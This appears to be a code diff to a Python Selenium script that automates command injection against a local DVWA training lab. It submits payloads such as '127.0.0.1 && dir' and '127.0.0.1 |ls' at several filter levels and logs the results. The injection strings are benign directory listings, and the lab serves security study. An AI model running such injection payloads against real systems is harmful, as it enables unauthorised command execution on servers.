@@ -41,11 +41,14 @@ def login(level):
     
     driver.find_element_by_xpath('/html/body/div/div[3]/div/form/input[1]').click()
     time.sleep(0.5)
-    print(driver.get_cookies())
+    # print(driver.get_cookies())
 
 
-def command_inj(option, level):
-    login(level)
+def command_inj(option, level, level_login):
+    if (1 > level_login) or (4 < level_login):
+        log.write_log('301 NOT', 'COMMAND_INJECTION || ' , "Chưa chọn mức độ phòng thủ")
+        return
+    login(level_login)
     driver.get("http://localhost/dvwa/vulnerabilities/exec/")
     input = driver.find_element_by_xpath('/html/body/div/div[3]/div/div/form/p/input[1]')
     command = ""
@@ -54,26 +57,44 @@ def command_inj(option, level):
             command = "127.0.0.1 && dir"
         else :
             command = '127.0.0.1 && ls'
-    if level == 2:
+    elif level == 2:
         if option == 'win':
-            command = "127.0.0.1 && dir"
+            command = "127.0.0.1 & dir"
         else :
-            command = '127.0.0.1 && ls'
+            command = '127.0.0.1 & ls'
+    elif level == 3:
+        if option == 'win':
+            command = "127.0.0.1 |dir"
+        else :
+            command = '127.0.0.1 |ls'
+    elif level == 4:
+        if option == 'win':
+            command = "127.0.0.1 |dir"
+        else :
+            command = '127.0.0.1 |ls'
+    else:
+        log.write_log('300 NOT', 'COMMAND_INJECTION || ' + command, "Chưa chọn mức độ tấn công")
+        driver.close()
+        return
     input.send_keys(command)
     input.send_keys(Keys.ENTER)
+    time.sleep(0.5)
     try:
         result = driver.find_element_by_xpath('/html/body/div/div[3]/div/div/pre')
         text_result = result.text
         info_dir = text_result.split('Average = 0ms')
         if(len(info_dir[1])) :
-            log.write_log('200 OK', 'COMMAND_INJECTION', info_dir[1])
+            log.write_log('200 OK', 'COMMAND_INJECTION || ' + command, info_dir[1])
         else:
-            log.write_log('400 NOT', 'COMMAND_INJECTION', 'Tấn công thất bại')
+            log.write_log('400 NOT', 'COMMAND_INJECTION || ' + command, 'Tấn công thất bại')
     except:
-        log.write_log('500 WARNING', 'COMMAND_INJECTION', 'Time out')
+        if 'Bad parameter dir' not in result.text :
+            log.write_log('500 WARNING', 'COMMAND_INJECTION || ' + command, result.text)
+        else:
+            log.write_log('400 NOT', 'COMMAND_INJECTION || ' + command, 'Tấn công thất bại')
     driver.close()
-command_inj('win', 1)
-command_inj('win', 2)
+
+command_inj('win', 1, 5)
 
 
 
